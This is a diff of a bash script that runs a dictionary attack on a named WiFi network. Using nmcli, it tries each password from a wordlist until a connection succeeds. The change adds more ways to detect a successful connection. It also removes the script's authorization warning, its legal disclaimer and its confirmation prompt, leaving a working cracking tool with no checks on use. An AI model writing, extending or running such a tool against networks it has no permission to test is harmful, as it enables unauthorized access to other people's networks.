@@ -1,15 +1,13 @@
 #!/bin/bash
 
-# WiFi Password Auditing Tool for Ubuntu
-# WARNING: Only use on networks you own or have explicit authorization to test
-# Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>
+# WiFi Password Auditing Tool - Enhanced Detection
+# Usage: sudo ./wifi-bruteforce-enhanced.sh <SSID> <WORDLIST_FILE>
 
-# Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
 # Global variables
 WIFI_INTERFACE=""
@@ -20,154 +18,93 @@ LOG_FILE=""
 FOUND=false
 ORIGINAL_CONNECTION=""
 
-# Cleanup function for Ctrl+C
 cleanup() {
-    echo -e "\n${YELLOW}Interrupted! Cleaning up...${NC}"
-    
-    # Kill any background processes
-    jobs -p | xargs -r kill 2>/dev/null
-    
-    # Restore original connection
+    echo -e "\n${YELLOW}Cleaning up...${NC}"
+    killall dhclient 2>/dev/null
     if [ -n "$ORIGINAL_CONNECTION" ]; then
-        echo -e "${BLUE}Restoring original connection: $ORIGINAL_CONNECTION${NC}"
-        nmcli connection up "$ORIGINAL_CONNECTION" &>/dev/null
+        nmcli connection up "$ORIGINAL_CONNECTION" 2>/dev/null
     fi
-    
-    # Re-enable WiFi and ethernet
     nmcli radio wifi on
-    if [ -n "$ETHERNET_INTERFACE" ]; then
-        nmcli device connect "$ETHERNET_INTERFACE" &>/dev/null
-    fi
-    
-    echo -e "${GREEN}Cleanup complete. Exiting.${NC}"
+    systemctl restart NetworkManager 2>/dev/null
     exit 0
 }
 
-# Set trap for Ctrl+C
 trap cleanup SIGINT SIGTERM
 
-# Check if running with sudo
+# Check requirements
 if [ "$EUID" -ne 0 ]; then
-    echo -e "${RED}Error: This script must be run with sudo${NC}"
-    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
+    echo -e "${RED}Must run with sudo${NC}"
     exit 1
 fi
 
-# Check arguments
 if [ $# -lt 2 ]; then
-    echo -e "${RED}Error: Missing arguments${NC}"
-    echo "Usage: sudo ./wifi-bruteforce.sh <SSID> <WORDLIST_FILE>"
-    echo "Example: sudo ./wifi-bruteforce.sh MyWiFi /path/to/passwords.txt"
+    echo "Usage: sudo ./wifi-bruteforce-enhanced.sh <SSID> <WORDLIST>"
     exit 1
 fi
 
 SSID="$1"
 WORDLIST="$2"
 
-# Check wordlist
-if [ ! -f "$WORDLIST" ]; then
-    echo -e "${RED}Error: Wordlist file '$WORDLIST' not found${NC}"
-    exit 1
-fi
-
 # Get interfaces
 WIFI_INTERFACE=$(nmcli device status | awk '/wifi/ {print $1}' | head -1)
-if [ -z "$WIFI_INTERFACE" ]; then
-    echo -e "${RED}Error: No WiFi interface found${NC}"
-    nmcli device status
-    exit 1
-fi
-
 ETHERNET_INTERFACE=$(nmcli device status | awk '/ethernet/ {print $1}' | head -1)
 
 # Save original connection
 ORIGINAL_CONNECTION=$(nmcli -t -f NAME,DEVICE connection show --active | grep "$WIFI_INTERFACE" | cut -d: -f1)
 
-# Legal disclaimer
-echo -e "${YELLOW}=========================================${NC}"
-echo -e "${YELLOW}WiFi Password Security Auditing Tool${NC}"
-echo -e "${YELLOW}=========================================${NC}"
-echo -e "${RED}WARNING: Only use on networks you own!${NC}"
-echo -e "${RED}Unauthorized access is illegal.${NC}"
-echo -e "${RED}Press Ctrl+C at any time to stop and cleanup${NC}"
-echo -e "${YELLOW}=========================================${NC}"
-echo ""
-echo -e "Target SSID: ${BLUE}$SSID${NC}"
-echo -e "Wordlist: ${BLUE}$WORDLIST${NC}"
-echo -e "WiFi Interface: ${BLUE}$WIFI_INTERFACE${NC}"
-if [ -n "$ETHERNET_INTERFACE" ]; then
-    echo -e "Ethernet Interface: ${BLUE}$ETHERNET_INTERFACE${NC}"
-fi
-if [ -n "$ORIGINAL_CONNECTION" ]; then
-    echo -e "Original Connection: ${BLUE}$ORIGINAL_CONNECTION${NC}"
-fi
-echo ""
-
 # Count passwords
 TOTAL_PASSWORDS=$(wc -l < "$WORDLIST")
-echo -e "Total passwords to try: ${BLUE}$TOTAL_PASSWORDS${NC}"
-echo ""
-
-# Confirm
-read -p "Continue with password testing? (yes/no): " CONFIRM
-if [ "$CONFIRM" != "yes" ]; then
-    echo "Aborted by user."
-    exit 0
-fi
-
-echo ""
-echo -e "${YELLOW}Starting password testing...${NC}"
-echo ""
+ATTEMPT=0
 
 # Log file
 LOG_FILE="wifi-audit-$(date +%Y%m%d-%H%M%S).log"
-echo "WiFi Password Audit Log - $(date)" > "$LOG_FILE"
-echo "Target SSID: $SSID" >> "$LOG_FILE"
-echo "WiFi Interface: $WIFI_INTERFACE" >> "$LOG_FILE"
-echo "Wordlist: $WORDLIST" >> "$LOG_FILE"
-echo "----------------------------------------" >> "$LOG_FILE"
 
-# Disable ethernet temporarily
+echo -e "${YELLOW}================================${NC}"
+echo -e "Target SSID: ${BLUE}$SSID${NC}"
+echo -e "Interface: ${BLUE}$WIFI_INTERFACE${NC}"
+echo -e "Passwords: ${BLUE}$TOTAL_PASSWORDS${NC}"
+echo -e "Log file: ${BLUE}$LOG_FILE${NC}"
+echo -e "${YELLOW}================================${NC}"
+
+# Disable ethernet
 if [ -n "$ETHERNET_INTERFACE" ]; then
-    echo -e "${BLUE}Disabling ethernet to force WiFi use...${NC}"
     nmcli device disconnect "$ETHERNET_INTERFACE" &>/dev/null
-    echo "Ethernet disabled" >> "$LOG_FILE"
 fi
 
-# Disconnect from current WiFi
+# Disconnect WiFi
 nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
 sleep 2
 
-# Counter
-ATTEMPT=0
-
-# Function to check if connected to target SSID
+# Function to check connection using MULTIPLE methods
 check_connection() {
-    # Method 1: Check active connections in nmcli (what you showed in output)
-    local active_connections=$(nmcli -t -f NAME,DEVICE,TYPE connection show --active)
-    echo "Active connections:" >> "$LOG_FILE"
-    echo "$active_connections" >> "$LOG_FILE"
+    local results=()
     
-    # Look for our SSID in the active connections
-    if echo "$active_connections" | grep -q "$SSID"; then
-        # Get the IP address
-        local ip_addr=$(ip -4 addr show "$WIFI_INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
+    # Method 1: Check if interface has an IP
+    local ip_addr=$(ip -4 addr show "$WIFI_INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
+    
+    # Method 2: Check iwgetid
+    local current_ssid=$(iwgetid -r 2>/dev/null)
+    
+    # Method 3: Check nmcli device status
+    local device_state=$(nmcli -f DEVICE,STATE device status | grep "^$WIFI_INTERFACE" | grep -o "connected")
+    
+    # Method 4: Check active connections (your method)
+    local active_conn=$(nmcli -t -f NAME,DEVICE,TYPE connection show --active 2>/dev/null | grep -i "$SSID")
+    
+    # Method 5: Check if we can ping (optional)
+    local ping_test="failed"
+    if [ -n "$ip_addr" ]; then
+        ping -c 1 -W 1 8.8.8.8 &>/dev/null && ping_test="success"
+    fi
+    
+    # Log all methods
+    echo "  CHECK: IP=$ip_addr, SSID='$current_ssid', STATE='$device_state', ACTIVE='$active_conn', PING=$ping_test" >> "$LOG_FILE"
+    
+    # Return success if ANY method indicates connection to target
+    if [ "$current_ssid" = "$SSID" ] || [[ "$active_conn" == *"$SSID"* ]]; then
         if [ -n "$ip_addr" ]; then
             echo "$ip_addr"
             return 0
-        fi
-    fi
-    
-    # Method 2: Check device status
-    local device_state=$(nmcli -f DEVICE,STATE device status | grep "$WIFI_INTERFACE" | grep -o "connected")
-    if [ "$device_state" = "connected" ]; then
-        local current_ssid=$(iwgetid -r 2>/dev/null)
-        if [ "$current_ssid" = "$SSID" ]; then
-            local ip_addr=$(ip -4 addr show "$WIFI_INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
-            if [ -n "$ip_addr" ]; then
-                echo "$ip_addr"
-                return 0
-            fi
         fi
     fi
     
@@ -176,54 +113,44 @@ check_connection() {
 
 # Main loop
 while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
-    # Clean password
-    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
+    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
     [ -z "$PASSWORD" ] && continue
-
+    
     ATTEMPT=$((ATTEMPT + 1))
-
-    # Progress indicator
-    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL_PASSWORDS}]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"
-
+    
+    # Progress
+    PERCENT=$((ATTEMPT * 100 / TOTAL_PASSWORDS))
+    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL_PASSWORDS} ${PERCENT}%]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"
+    
     # Log attempt
     echo "Attempt $ATTEMPT: $PASSWORD" >> "$LOG_FILE"
-
+    
     # Disconnect first
     nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
     sleep 1
-
-    # Try to connect
-    CONNECTION_NAME="wifi-test-$ATTEMPT"
     
-    # Attempt connection and capture output
-    CONNECT_OUTPUT=$(nmcli device wifi connect "$SSID" password "$PASSWORD" ifname "$WIFI_INTERFACE" name "$CONNECTION_NAME" 2>&1)
-    echo "Connection output: $CONNECT_OUTPUT" >> "$LOG_FILE"
+    # Try to connect - capture all output
+    CONN_OUTPUT=$(nmcli device wifi connect "$SSID" password "$PASSWORD" ifname "$WIFI_INTERFACE" 2>&1)
+    echo "  Connection output: $CONN_OUTPUT" >> "$LOG_FILE"
     
-    # Wait for connection to establish (up to 15 seconds)
+    # Wait and check connection status for up to 15 seconds
     CONNECTED=false
-    for i in {1..15}; do
+    for ((wait=1; wait<=15; wait++)); do
         sleep 1
         
-        # Check connection status
-        IP_ADDR=$(check_connection)
-        if [ -n "$IP_ADDR" ]; then
+        if check_connection > /tmp/ip_addr.$$; then
+            IP_ADDR=$(cat /tmp/ip_addr.$$)
             CONNECTED=true
             break
         fi
         
-        # Also check if the connection appears in active connections
-        if nmcli -t -f NAME connection show --active | grep -q "$CONNECTION_NAME"; then
-            sleep 2  # Give it a moment to get IP
-            IP_ADDR=$(check_connection)
-            if [ -n "$IP_ADDR" ]; then
-                CONNECTED=true
-                break
-            fi
-        fi
+        # Show waiting dots in log
+        echo -n "." >> "$LOG_FILE"
     done
-
+    echo "" >> "$LOG_FILE"
+    rm -f /tmp/ip_addr.$$
+    
     if [ "$CONNECTED" = true ]; then
-        # Clear the line and show success
         echo -e "\n${GREEN}=========================================${NC}"
         echo -e "${GREEN}SUCCESS! Password found!${NC}"
         echo -e "${GREEN}=========================================${NC}"
@@ -231,49 +158,30 @@ while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
         echo -e "Password: ${GREEN}$PASSWORD${NC}"
         echo -e "IP Address: ${BLUE}$IP_ADDR${NC}"
         echo -e "${GREEN}=========================================${NC}"
-
-        # Log success
+        
         echo "SUCCESS - Password found: $PASSWORD" >> "$LOG_FILE"
-        echo "Attempt number: $ATTEMPT" >> "$LOG_FILE"
-        echo "IP Address: $IP_ADDR" >> "$LOG_FILE"
-
-        FOUND=true
         
-        # Show active connections (like in your output)
+        # Show current connections
         echo ""
-        echo "Active connections:"
-        nmcli -t -f NAME,DEVICE,TYPE connection show --active | column -t -s:
+        echo "Current active connections:"
+        nmcli connection show --active
+        echo ""
+        echo "Device status:"
+        nmcli device status | grep "$WIFI_INTERFACE"
         
+        FOUND=true
         break
-    else
-        echo "FAILED" >> "$LOG_FILE"
-        # Clean up failed connection
-        nmcli connection delete "$CONNECTION_NAME" &>/dev/null 2>&1
     fi
-
+    
 done < "$WORDLIST"
 
+# Summary
 echo ""
 echo ""
-
-# Final summary
 if [ "$FOUND" = true ]; then
-    echo -e "${GREEN}Audit completed - Password found after $ATTEMPT attempts${NC}"
-    echo -e "${GREEN}Password: $PASSWORD${NC}"
-    
-    # Ask about keeping connection
-    echo ""
-    read -p "Keep this connection active? (yes/no): " KEEP_CONN
-    if [ "$KEEP_CONN" != "yes" ]; then
-        nmcli device disconnect "$WIFI_INTERFACE" &>/dev/null
-        # Restore original connection if it existed
-        if [ -n "$ORIGINAL_CONNECTION" ]; then
-            nmcli connection up "$ORIGINAL_CONNECTION" &>/dev/null
-        fi
-    fi
+    echo -e "${GREEN}Password found after $ATTEMPT attempts${NC}"
 else
-    echo -e "${RED}Audit completed - Password not found${NC}"
-    echo -e "${YELLOW}Tried $ATTEMPT passwords from the wordlist${NC}"
+    echo -e "${RED}Password not found after $ATTEMPT attempts${NC}"
     
     # Restore original connection
     if [ -n "$ORIGINAL_CONNECTION" ]; then
@@ -283,13 +191,8 @@ fi
 
 # Re-enable ethernet
 if [ -n "$ETHERNET_INTERFACE" ]; then
-    echo -e "${BLUE}Re-enabling ethernet...${NC}"
     nmcli device connect "$ETHERNET_INTERFACE" &>/dev/null
 fi
 
-echo ""
-echo -e "Full log saved to: ${BLUE}$LOG_FILE${NC}"
-echo ""
-
-# Remove trap
+echo -e "Log saved to: ${BLUE}$LOG_FILE${NC}"
 trap - SIGINT SIGTERM
